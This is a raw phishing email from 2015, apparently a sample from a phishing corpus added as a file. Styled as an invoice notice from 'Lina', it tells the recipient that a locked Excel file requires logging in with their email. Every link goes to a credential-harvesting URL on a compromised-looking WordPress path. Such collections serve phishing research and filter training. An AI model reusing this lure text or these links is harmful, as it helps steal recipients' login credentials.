@@ -1,0 +1,99 @@
+Return-Path: <info@erkdental.com>
+X-Original-To: jose@login.monkey.org
+Delivered-To: jose@login.monkey.org
+Received: from forward.b.hostedemail.com (forward.b.hostedemail.com [64.98.36.17])
+	by l.monkey.org (Postfix) with ESMTP id 91A5AF40B6
+	for <jose@login.monkey.org>; Thu, 12 Mar 2015 14:55:34 -0500 (CDT)
+Received: from smtpin04.hostedemail.com (10.5.19.248.rfc1918.com [10.5.19.248])
+	by ofarelay01.b.hostedemail.com (Postfix) with SMTP id 451E034E016
+	for <jose@login.monkey.org>; Thu, 12 Mar 2015 19:55:34 +0000 (UTC)
+X-Forwarded-For: jose@monkey.org by Hostedemail
+Delivered-To: jose@monkey.org
+X-FDA: 69957947388.04.rest97_136320fd7c55a
+Authentication-Results: auth.b.hostedemail.com; dmarc=none header.from=erkdental.com
+Authentication-Results: auth.b.hostedemail.com; dkim=none
+	reason="no signature"; dkim-adsp=none (insecure policy);
+	dkim-atps=neutral
+X-Spam-Summary: 50,0,0,91c7cefd389b6665,d41d8cd98f00b204,info@erkdental.com,:info@erkdental.com,RULES_HIT:41:72:355:379:560:962:967:973:983:988:989:1189:1208:1213:1221:1260:1261:1263:1313:1314:1345:1381:1390:1394:1395:1430:1431:1432:1436:1437:1516:1517:1518:1534:1542:1545:1550:1560:1565:1575:1588:1589:1592:1594:1711:1714:1730:1749:1777:1792:2194:2199:2525:2527:2567:2610:2682:2685:2859:2909:2933:2937:2939:2942:2945:2947:2951:2954:3022:3040:3138:3139:3140:3141:3142:3148:3421:3865:3867:3868:3870:3871:3873:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4321:4361:4552:5007:6119:6261:6650:6678:6687:7211:7652:7933:8599:9025:9060:9108:9388:9416:9469:9908:10004:10049:10346:10400:10482:11473:11658:11914:12043:12438:12519:12555:12561:12740:13139:13234:13235:13236:13237:14036:14094:14096:14246:19901:19997:21080,0,RBL:neutral,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:fn,MSBL:0,DNSBL:neutral,Custom_rules:0:0:0
+X-HE-Tag: rest97_136320fd7c55a
+X-Filterd-Recvd-Size: 3927
+Received: from mail-cld-x26.mail.trdns.com (mail-cld-x26.mail.trdns.com [77.245.152.26])
+	by imf30.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Thu, 12 Mar 2015 19:55:32 +0000 (UTC)
+Received: from mail05.mail.trdns.com (10.99.100.65 [10.99.100.65])
+        by mail-cld-x26.mail.trdns.com (IceWarp 10.3.5) with ESMTP (SSL) id ZWQ62406;
+        Thu, 12 Mar 2015 21:56:06 +0200
+Received: from [104.232.32.16] ([104.232.32.16])
+        by mail05.mail.trdns.com (IceWarp 11.1.0.1 x64) with ASMTP id 201503122156053261;
+        Thu, 12 Mar 2015 21:56:05 +0200
+Content-Type: multipart/alternative; boundary="===============1591183124=="
+MIME-Version: 1.0
+Subject: Revised Order
+To: Recipients <info@erkdental.com>
+From: info@erkdental.com
+Date: Thu, 12 Mar 2015 14:54:04 -0400
+Message-ID: <63370f5717c5510ffabb9e45b10ca859@erkdental.com>
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 42
+
+You will not see this in a MIME-aware mail reader.
+--===============1591183124==
+Content-Type: text/plain; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+Enclosed is the Invoice in excel file, the file has been locked to you, log=
+ in with your email to view
+Please check and confirm.
+
+Best regards,
+Lina
+
+ 1 attachments (total 53.9 KB)
+ =
+
+  View slide show (1)  Download=20
+--===============1591183124==
+Content-Type: text/html; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<HTML><head><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=
+=3Diso-8859-1"/></head><BODY><P><SPAN style=3D"WHITE-SPACE: normal; WORD-SP=
+ACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; COLOR: rgb(34,34,34); FONT: =
+12px arial, sans-serif; DISPLAY: inline; LETTER-SPACING: normal; BACKGROUND=
+-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; -webkit-text-stroke-width: 0px"=
+>Enclosed is the Invoice in excel file, the file has been locked to you, lo=
+g in with your email to view<BR>Please check and confirm.<BR><BR>Best regar=
+ds,<BR>Lina<BR></SPAN></P>
+<P>1 attachments (total 53.9 KB)</P>
+<P><A href=3D"http://tinfs.com/domini/payment%20page/qcmwp.com/new/wp-admin=
+/excel/" target=3D_blank><IMG alt=3Dhttp://tinfs.com/domini/payment%20page/=
+qcmwp.com/new/wp-admin/excel/Capture12.JPG src=3D"http://tinfs.com/domini/p=
+ayment%20page/qcmwp.com/new/wp-admin/excel/Capture12.JPG" width=3D126 heigh=
+t=3D174></A></P>
+<DIV style=3D"WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none;=
+ COLOR: rgb(0,0,0); FONT: 16px 'Helvetica Neue', 'Segoe UI', Helvetica, Ari=
+al, 'Lucida Grande', sans-serif; LETTER-SPACING: normal; BACKGROUND-COLOR: =
+rgb(255,255,255); TEXT-INDENT: 0px; -webkit-text-stroke-width: 0px; font-st=
+retch: normal">
+<DIV id=3Dyiv3612970117yui_3_16_0_1_1423427369116_22388 class=3Dyiv36129701=
+17><A id=3Dyiv3612970117yui_3_16_0_1_1416180780200_9972 class=3Dyiv36129701=
+17 style=3D"TEXT-DECORATION: underline; BACKGROUND: none transparent scroll=
+ repeat 0% 0%; COLOR: rgb(25,106,212); OUTLINE-WIDTH: medium; PADDING-BOTTO=
+M: 0px; PADDING-TOP: 0px; OUTLINE-STYLE: none; PADDING-LEFT: 0px; MARGIN: 0=
+px; OUTLINE-COLOR: invert; PADDING-RIGHT: 0px" href=3D"http://tinfs.com/dom=
+ini/payment%20page/qcmwp.com/new/wp-admin/excel/" rel=3Dnofollow target=3D_=
+blank>View slide show (1)</A>&nbsp;&nbsp;<A id=3Dyiv3612970117yui_3_16_0_1_=
+1416180780200_9969 class=3Dyiv3612970117 style=3D"TEXT-DECORATION: underlin=
+e; BACKGROUND: none transparent scroll repeat 0% 0%; COLOR: rgb(25,106,212)=
+; OUTLINE-WIDTH: medium; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; OUTLINE-STY=
+LE: none; PADDING-LEFT: 0px; MARGIN: 0px; OUTLINE-COLOR: invert; PADDING-RI=
+GHT: 0px" href=3D"http://tinfs.com/domini/payment%20page/qcmwp.com/new/wp-a=
+dmin/excel/" rel=3Dnofollow target=3D_blank>Download</A> </DIV></DIV></BODY=
+></HTML>
+--===============1591183124==--
